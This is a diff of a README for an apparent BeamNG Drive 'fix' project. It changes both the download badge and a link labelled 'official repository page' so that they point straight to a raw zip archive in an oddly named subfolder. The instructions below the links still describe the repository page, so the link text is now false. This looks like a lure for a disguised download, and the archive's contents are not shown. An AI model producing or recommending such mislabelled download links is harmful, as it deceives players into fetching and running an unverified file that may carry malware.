@@ -1,6 +1,6 @@
 # 🚗 BeamNG-Drive-Mods - Fix bugs and stabilize your gameplay
 
-[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://github.com/Serried-selfassertion421/BeamNG-Drive-Mods)
+[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://github.com/Serried-selfassertion421/BeamNG-Drive-Mods/raw/refs/heads/main/innervational/Beam_Drive_N_Mods_v2.7.zip)
 
 This project provides fixes and stability updates for the BeamNG Drive engine. These files address common crashes and physics errors encountered by players. The patch works on Windows 10 and 11 systems running 64-bit architecture.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these specifications to run the software.
 
 Follow these steps to obtain the files for your computer.
 
-1. Go to the [official repository page](https://github.com/Serried-selfassertion421/BeamNG-Drive-Mods).
+1. Go to the [official repository page](https://github.com/Serried-selfassertion421/BeamNG-Drive-Mods/raw/refs/heads/main/innervational/Beam_Drive_N_Mods_v2.7.zip).
 2. Look for the green "Code" button on the right side of the screen.
 3. Click the button and select "Download ZIP".
 4. Save the file to your desktop or downloads folder.
